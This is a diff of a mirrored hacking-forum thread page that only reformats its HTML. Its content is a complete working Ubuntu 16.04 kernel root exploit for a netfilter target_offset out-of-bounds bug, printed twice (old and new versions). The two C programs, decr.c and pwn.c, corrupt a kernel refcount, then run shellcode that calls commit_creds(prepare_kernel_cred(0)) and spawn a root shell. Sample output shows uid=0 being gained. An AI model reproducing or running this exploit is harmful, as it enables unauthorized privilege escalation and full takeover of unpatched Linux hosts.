@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=6883&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:08:48 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6883&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:08:48 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> Ubuntu 16.04 local root exploit - netfilter target_offset OOB</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -46,266 +43,266 @@
 	<div class="content">
 		<blockquote class="restore"><div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">--------------------------------------------------- decr.c ---------------------------------------------------<br />
-/**<br />
-&nbsp;* Ubuntu 16.04 local root exploit - netfilter target_offset OOB<br />
-&nbsp;* check_compat_entry_size_and_hooks/check_entry<br />
-&nbsp;*<br />
-&nbsp;* Tested on 4.4.0-21-generic. SMEP/SMAP bypass available in descr_v2.c<br />
-&nbsp;*<br />
-&nbsp;* Vitaly Nikolenko<br />
-&nbsp;* vnik@cyseclabs.com<br />
-&nbsp;* 23/04/2016<br />
-&nbsp;*<br />
-&nbsp;*<br />
-&nbsp;* ip_tables.ko needs to be loaded (e.g., iptables -L as root triggers<br />
-&nbsp;* automatic loading).<br />
-&nbsp;*<br />
-&nbsp;* vnik@ubuntu:~$ uname -a<br />
-&nbsp;* Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux<br />
-&nbsp;* vnik@ubuntu:~$ gcc decr.c -m32 -O2 -o decr<br />
-&nbsp;* vnik@ubuntu:~$ gcc pwn.c -O2 -o pwn<br />
-&nbsp;* vnik@ubuntu:~$ ./decr <br />
-&nbsp;* netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik<br />
-&nbsp;* [!] Decrementing the refcount. This may take a while...<br />
-&nbsp;* [!] Wait for the &quot;Done&quot; message (even if you'll get the prompt back).<br />
-&nbsp;* vnik@ubuntu:~$ [+] Done! Now run ./pwn<br />
-&nbsp;* <br />
-&nbsp;* vnik@ubuntu:~$ ./pwn<br />
-&nbsp;* [+] Escalating privs...<br />
-&nbsp;* root@ubuntu:~# id<br />
-&nbsp;* uid=0(root) gid=0(root) groups=0(root)<br />
-&nbsp;* root@ubuntu:~# <br />
-&nbsp;* <br />
-&nbsp;*/<br />
-<br />
-#define _GNU_SOURCE<br />
-#include &lt;stdio.h&gt;<br />
-#include &lt;stdlib.h&gt;<br />
-#include &lt;string.h&gt;<br />
-#include &lt;unistd.h&gt;<br />
-#include &lt;sched.h&gt;<br />
-#include &lt;linux/sched.h&gt;<br />
-#include &lt;errno.h&gt;<br />
-#include &lt;sys/types.h&gt;<br />
-#include &lt;sys/socket.h&gt;<br />
-#include &lt;sys/ptrace.h&gt;<br />
-#include &lt;netinet/in.h&gt;<br />
-#include &lt;net/if.h&gt;<br />
-#include &lt;linux/netfilter_ipv4/ip_tables.h&gt;<br />
-#include &lt;linux/netlink.h&gt;<br />
-#include &lt;fcntl.h&gt;<br />
-#include &lt;sys/mman.h&gt;<br />
-<br />
-#define MALLOC_SIZE 66*1024<br />
-<br />
-int check_smaep() {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; FILE *proc_cpuinfo;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; char fbuf[512];<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; proc_cpuinfo = fopen(&quot;/proc/cpuinfo&quot;, &quot;r&quot;);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; if (proc_cpuinfo &lt; 0) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror(&quot;fopen&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -1;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; memset(fbuf, 0, sizeof(fbuf));<br />
-&nbsp; &nbsp; &nbsp; &nbsp; <br />
-&nbsp; &nbsp; &nbsp; &nbsp; while(fgets(fbuf, 512, proc_cpuinfo) != NULL) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (strlen(fbuf) == 0)<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; continue;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (strstr(fbuf, &quot;smap&quot;) || strstr(fbuf, &quot;smep&quot;)) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fclose(proc_cpuinfo);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -1;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; fclose(proc_cpuinfo);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; return 0;<br />
-}<br />
-<br />
-int check_mod() {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; FILE *proc_modules;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; char fbuf[256];<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; proc_modules = fopen(&quot;/proc/modules&quot;, &quot;r&quot;);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; if (proc_modules &lt; 0) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror(&quot;fopen&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -1;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; memset(fbuf, 0, sizeof(fbuf));<br />
-&nbsp; &nbsp; &nbsp; &nbsp; <br />
-&nbsp; &nbsp; &nbsp; &nbsp; while(fgets(fbuf, 256, proc_modules) != NULL) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (strlen(fbuf) == 0)<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; continue;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (!strncmp(&quot;ip_tables&quot;, fbuf, 9)) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fclose(proc_modules);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 0;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; fclose(proc_modules);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; return -1;<br />
-}<br />
-<br />
-int decr(void *p) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; int sock, optlen;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; int ret;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; void *data;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; struct ipt_replace *repl;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; struct ipt_entry *entry;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; struct xt_entry_match *ematch;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; struct xt_standard_target *target;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; unsigned i;<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; if (sock == -1) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror(&quot;socket&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -1;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; data = malloc(MALLOC_SIZE);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; if (data == NULL) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror(&quot;malloc&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -1;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; memset(data, 0, MALLOC_SIZE);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; repl = (struct ipt_replace *) data;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; repl-&gt;num_entries = 1;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; repl-&gt;num_counters = 1;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; repl-&gt;size = sizeof(*repl) + sizeof(*target) + 0xffff;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; repl-&gt;valid_hooks = 0;<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; entry = (struct ipt_entry *) (data + sizeof(struct ipt_replace));<br />
-&nbsp; &nbsp; &nbsp; &nbsp; entry-&gt;target_offset = 74; // overwrite target_offset<br />
-&nbsp; &nbsp; &nbsp; &nbsp; entry-&gt;next_offset = sizeof(*entry) + sizeof(*ematch) + sizeof(*target);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; ematch = (struct xt_entry_match *) (data + sizeof(struct ipt_replace) + sizeof(*entry));<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; strcpy(ematch-&gt;u.user.name, &quot;icmp&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; void *kmatch = (void*)mmap((void *)0x10000, 0x1000, 7, 0x32, 0, 0);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; uint64_t *me = (uint64_t *)(kmatch + 0x58);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; *me = 0xffffffff821de10d; // magic number!<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; uint32_t *match = (uint32_t *)((char *)&amp;ematch-&gt;u.kernel.match + 4);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; *match = (uint32_t)kmatch;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; <br />
-&nbsp; &nbsp; &nbsp; &nbsp; ematch-&gt;u.match_size = (short)0xffff;<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; target = (struct xt_standard_target *)(data + sizeof(struct ipt_replace) + 0xffff + 0x8);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; uint32_t *t = (uint32_t *)target;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; *t = (uint32_t)kmatch;<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; printf(&quot;[!] Decrementing the refcount. This may take a while...\n&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; printf(&quot;[!] Wait for the \&quot;Done\&quot; message (even if you'll get the prompt back).\n&quot;);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; for (i = 0; i &lt; 0xffffff/2+1; i++) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *) data, 66*1024);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; close(sock);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; free(data);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; printf(&quot;[+] Done! Now run ./pwn\n&quot;);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; return 0;<br />
-}<br />
-<br />
-int main(void) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; void *stack;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; int ret;<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; printf(&quot;netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik\n&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; if (check_mod()) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(&quot;[-] No ip_tables module found! Quitting...\n&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -1;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; if (check_smaep()) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(&quot;[-] SMEP/SMAP support dectected! Quitting...\n&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -1;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; ret = unshare(CLONE_NEWUSER);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; if (ret == -1) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror(&quot;unshare&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -1;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; stack = (void *) malloc(65536);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; if (stack == NULL) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror(&quot;malloc&quot;);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -1;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; clone(decr, stack + 65536, CLONE_NEWNET, NULL);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; sleep(1);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; return 0;<br />
-}<br />
-<br />
---------------------------------------------------- pwn.c ---------------------------------------------------<br />
-<br />
-/**<br />
-&nbsp;* Run ./decr first!<br />
-&nbsp;*<br />
-&nbsp;* 23/04/2016<br />
-&nbsp;* - vnik<br />
-&nbsp;*/<br />
-#include &lt;stdio.h&gt;<br />
-#include &lt;string.h&gt;<br />
-#include &lt;errno.h&gt;<br />
-#include &lt;unistd.h&gt;<br />
-#include &lt;stdint.h&gt;<br />
-#include &lt;fcntl.h&gt;<br />
-#include &lt;sys/mman.h&gt;<br />
-#include &lt;assert.h&gt;<br />
-<br />
-#define MMAP_ADDR 0xff814e3000<br />
-#define MMAP_OFFSET 0xb0<br />
-<br />
-typedef int __attribute__((regparm(3))) (*commit_creds_fn)(uint64_t cred);<br />
-typedef uint64_t __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(uint64_t cred);<br />
-<br />
-void __attribute__((regparm(3))) privesc() {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; commit_creds_fn commit_creds = (void *)0xffffffff810a21c0;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; prepare_kernel_cred_fn prepare_kernel_cred = (void *)0xffffffff810a25b0;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; commit_creds(prepare_kernel_cred((uint64_t)NULL));<br />
-}<br />
-<br />
-int main() {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; void *payload = (void*)mmap((void *)MMAP_ADDR, 0x400000, 7, 0x32, 0, 0);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; assert(payload == (void *)MMAP_ADDR);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; void *shellcode = (void *)(MMAP_ADDR + MMAP_OFFSET);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; memset(shellcode, 0, 0x300000);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; void *ret = memcpy(shellcode, &amp;privesc, 0x300);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; assert(ret == shellcode);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; printf(&quot;[+] Escalating privs...\n&quot;);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; int fd = open(&quot;/dev/ptmx&quot;, O_RDWR);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; close(fd);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; assert(!getuid());<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; printf(&quot;[+] We've got root!&quot;);<br />
-<br />
-&nbsp; &nbsp; &nbsp; &nbsp; return execl(&quot;/bin/bash&quot;, &quot;-sh&quot;, NULL);<br />
-}</code><hr />
+	<hr/><code class="bbcode_code">--------------------------------------------------- decr.c ---------------------------------------------------<br/>
+/**<br/>
+ * Ubuntu 16.04 local root exploit - netfilter target_offset OOB<br/>
+ * check_compat_entry_size_and_hooks/check_entry<br/>
+ *<br/>
+ * Tested on 4.4.0-21-generic. SMEP/SMAP bypass available in descr_v2.c<br/>
+ *<br/>
+ * Vitaly Nikolenko<br/>
+ * vnik@cyseclabs.com<br/>
+ * 23/04/2016<br/>
+ *<br/>
+ *<br/>
+ * ip_tables.ko needs to be loaded (e.g., iptables -L as root triggers<br/>
+ * automatic loading).<br/>
+ *<br/>
+ * vnik@ubuntu:~$ uname -a<br/>
+ * Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux<br/>
+ * vnik@ubuntu:~$ gcc decr.c -m32 -O2 -o decr<br/>
+ * vnik@ubuntu:~$ gcc pwn.c -O2 -o pwn<br/>
+ * vnik@ubuntu:~$ ./decr <br/>
+ * netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik<br/>
+ * [!] Decrementing the refcount. This may take a while...<br/>
+ * [!] Wait for the "Done" message (even if you'll get the prompt back).<br/>
+ * vnik@ubuntu:~$ [+] Done! Now run ./pwn<br/>
+ * <br/>
+ * vnik@ubuntu:~$ ./pwn<br/>
+ * [+] Escalating privs...<br/>
+ * root@ubuntu:~# id<br/>
+ * uid=0(root) gid=0(root) groups=0(root)<br/>
+ * root@ubuntu:~# <br/>
+ * <br/>
+ */<br/>
+<br/>
+#define _GNU_SOURCE<br/>
+#include &lt;stdio.h&gt;<br/>
+#include &lt;stdlib.h&gt;<br/>
+#include &lt;string.h&gt;<br/>
+#include &lt;unistd.h&gt;<br/>
+#include &lt;sched.h&gt;<br/>
+#include &lt;linux/sched.h&gt;<br/>
+#include &lt;errno.h&gt;<br/>
+#include &lt;sys/types.h&gt;<br/>
+#include &lt;sys/socket.h&gt;<br/>
+#include &lt;sys/ptrace.h&gt;<br/>
+#include &lt;netinet/in.h&gt;<br/>
+#include &lt;net/if.h&gt;<br/>
+#include &lt;linux/netfilter_ipv4/ip_tables.h&gt;<br/>
+#include &lt;linux/netlink.h&gt;<br/>
+#include &lt;fcntl.h&gt;<br/>
+#include &lt;sys/mman.h&gt;<br/>
+<br/>
+#define MALLOC_SIZE 66*1024<br/>
+<br/>
+int check_smaep() {<br/>
+        FILE *proc_cpuinfo;<br/>
+        char fbuf[512];<br/>
+<br/>
+        proc_cpuinfo = fopen("/proc/cpuinfo", "r");<br/>
+<br/>
+        if (proc_cpuinfo &lt; 0) {<br/>
+                perror("fopen");<br/>
+                return -1;<br/>
+        }<br/>
+<br/>
+        memset(fbuf, 0, sizeof(fbuf));<br/>
+        <br/>
+        while(fgets(fbuf, 512, proc_cpuinfo) != NULL) {<br/>
+                if (strlen(fbuf) == 0)<br/>
+                        continue;<br/>
+                <br/>
+                if (strstr(fbuf, "smap") || strstr(fbuf, "smep")) {<br/>
+                        fclose(proc_cpuinfo);<br/>
+                        return -1;<br/>
+                }<br/>
+        }<br/>
+<br/>
+        fclose(proc_cpuinfo);<br/>
+        return 0;<br/>
+}<br/>
+<br/>
+int check_mod() {<br/>
+        FILE *proc_modules;<br/>
+        char fbuf[256];<br/>
+<br/>
+        proc_modules = fopen("/proc/modules", "r");<br/>
+<br/>
+        if (proc_modules &lt; 0) {<br/>
+                perror("fopen");<br/>
+                return -1;<br/>
+        }<br/>
+<br/>
+        memset(fbuf, 0, sizeof(fbuf));<br/>
+        <br/>
+        while(fgets(fbuf, 256, proc_modules) != NULL) {<br/>
+                if (strlen(fbuf) == 0)<br/>
+                        continue;<br/>
+                <br/>
+                if (!strncmp("ip_tables", fbuf, 9)) {<br/>
+                        fclose(proc_modules);<br/>
+                        return 0;<br/>
+                }<br/>
+        }<br/>
+<br/>
+        fclose(proc_modules);<br/>
+        return -1;<br/>
+}<br/>
+<br/>
+int decr(void *p) {<br/>
+        int sock, optlen;<br/>
+        int ret;<br/>
+        void *data;<br/>
+        struct ipt_replace *repl;<br/>
+        struct ipt_entry *entry;<br/>
+        struct xt_entry_match *ematch;<br/>
+        struct xt_standard_target *target;<br/>
+        unsigned i;<br/>
+<br/>
+        sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);<br/>
+<br/>
+        if (sock == -1) {<br/>
+                perror("socket");<br/>
+                return -1;<br/>
+        }<br/>
+<br/>
+        data = malloc(MALLOC_SIZE);<br/>
+<br/>
+        if (data == NULL) {<br/>
+                perror("malloc");<br/>
+                return -1;<br/>
+        }<br/>
+<br/>
+        memset(data, 0, MALLOC_SIZE);<br/>
+<br/>
+        repl = (struct ipt_replace *) data;<br/>
+        repl-&gt;num_entries = 1;<br/>
+        repl-&gt;num_counters = 1;<br/>
+        repl-&gt;size = sizeof(*repl) + sizeof(*target) + 0xffff;<br/>
+        repl-&gt;valid_hooks = 0;<br/>
+<br/>
+        entry = (struct ipt_entry *) (data + sizeof(struct ipt_replace));<br/>
+        entry-&gt;target_offset = 74; // overwrite target_offset<br/>
+        entry-&gt;next_offset = sizeof(*entry) + sizeof(*ematch) + sizeof(*target);<br/>
+<br/>
+        ematch = (struct xt_entry_match *) (data + sizeof(struct ipt_replace) + sizeof(*entry));<br/>
+<br/>
+        strcpy(ematch-&gt;u.user.name, "icmp");<br/>
+        void *kmatch = (void*)mmap((void *)0x10000, 0x1000, 7, 0x32, 0, 0);<br/>
+        uint64_t *me = (uint64_t *)(kmatch + 0x58);<br/>
+        *me = 0xffffffff821de10d; // magic number!<br/>
+<br/>
+        uint32_t *match = (uint32_t *)((char *)&amp;ematch-&gt;u.kernel.match + 4);<br/>
+        *match = (uint32_t)kmatch;<br/>
+        <br/>
+        ematch-&gt;u.match_size = (short)0xffff;<br/>
+<br/>
+        target = (struct xt_standard_target *)(data + sizeof(struct ipt_replace) + 0xffff + 0x8);<br/>
+        uint32_t *t = (uint32_t *)target;<br/>
+        *t = (uint32_t)kmatch;<br/>
+<br/>
+        printf("[!] Decrementing the refcount. This may take a while...\n");<br/>
+        printf("[!] Wait for the \"Done\" message (even if you'll get the prompt back).\n");<br/>
+<br/>
+        for (i = 0; i &lt; 0xffffff/2+1; i++) {<br/>
+                ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *) data, 66*1024);<br/>
+        }<br/>
+<br/>
+        close(sock);<br/>
+        free(data);<br/>
+        printf("[+] Done! Now run ./pwn\n");<br/>
+<br/>
+        return 0;<br/>
+}<br/>
+<br/>
+int main(void) {<br/>
+        void *stack;<br/>
+        int ret;<br/>
+<br/>
+        printf("netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik\n");<br/>
+        if (check_mod()) {<br/>
+                printf("[-] No ip_tables module found! Quitting...\n");<br/>
+                return -1;<br/>
+        }<br/>
+<br/>
+        if (check_smaep()) {<br/>
+                printf("[-] SMEP/SMAP support dectected! Quitting...\n");<br/>
+                return -1;<br/>
+        }<br/>
+<br/>
+        ret = unshare(CLONE_NEWUSER);<br/>
+<br/>
+        if (ret == -1) {<br/>
+                perror("unshare");<br/>
+                return -1;<br/>
+        }<br/>
+<br/>
+        stack = (void *) malloc(65536);<br/>
+<br/>
+        if (stack == NULL) {<br/>
+                perror("malloc");<br/>
+                return -1;<br/>
+        }<br/>
+<br/>
+        clone(decr, stack + 65536, CLONE_NEWNET, NULL);<br/>
+<br/>
+        sleep(1);<br/>
+<br/>
+        return 0;<br/>
+}<br/>
+<br/>
+--------------------------------------------------- pwn.c ---------------------------------------------------<br/>
+<br/>
+/**<br/>
+ * Run ./decr first!<br/>
+ *<br/>
+ * 23/04/2016<br/>
+ * - vnik<br/>
+ */<br/>
+#include &lt;stdio.h&gt;<br/>
+#include &lt;string.h&gt;<br/>
+#include &lt;errno.h&gt;<br/>
+#include &lt;unistd.h&gt;<br/>
+#include &lt;stdint.h&gt;<br/>
+#include &lt;fcntl.h&gt;<br/>
+#include &lt;sys/mman.h&gt;<br/>
+#include &lt;assert.h&gt;<br/>
+<br/>
+#define MMAP_ADDR 0xff814e3000<br/>
+#define MMAP_OFFSET 0xb0<br/>
+<br/>
+typedef int __attribute__((regparm(3))) (*commit_creds_fn)(uint64_t cred);<br/>
+typedef uint64_t __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(uint64_t cred);<br/>
+<br/>
+void __attribute__((regparm(3))) privesc() {<br/>
+        commit_creds_fn commit_creds = (void *)0xffffffff810a21c0;<br/>
+        prepare_kernel_cred_fn prepare_kernel_cred = (void *)0xffffffff810a25b0;<br/>
+        commit_creds(prepare_kernel_cred((uint64_t)NULL));<br/>
+}<br/>
+<br/>
+int main() {<br/>
+        void *payload = (void*)mmap((void *)MMAP_ADDR, 0x400000, 7, 0x32, 0, 0);<br/>
+        assert(payload == (void *)MMAP_ADDR);<br/>
+<br/>
+        void *shellcode = (void *)(MMAP_ADDR + MMAP_OFFSET);<br/>
+<br/>
+        memset(shellcode, 0, 0x300000);<br/>
+<br/>
+        void *ret = memcpy(shellcode, &amp;privesc, 0x300);<br/>
+        assert(ret == shellcode);<br/>
+<br/>
+        printf("[+] Escalating privs...\n");<br/>
+<br/>
+        int fd = open("/dev/ptmx", O_RDWR);<br/>
+        close(fd);<br/>
+<br/>
+        assert(!getuid());<br/>
+<br/>
+        printf("[+] We've got root!");<br/>
+<br/>
+        return execl("/bin/bash", "-sh", NULL);<br/>
+}</code><hr/>
 </div></blockquote>
 	</div>
 </li>
@@ -314,14 +311,14 @@ int main() {<br />
 
 </div>
 <div class="below_body">
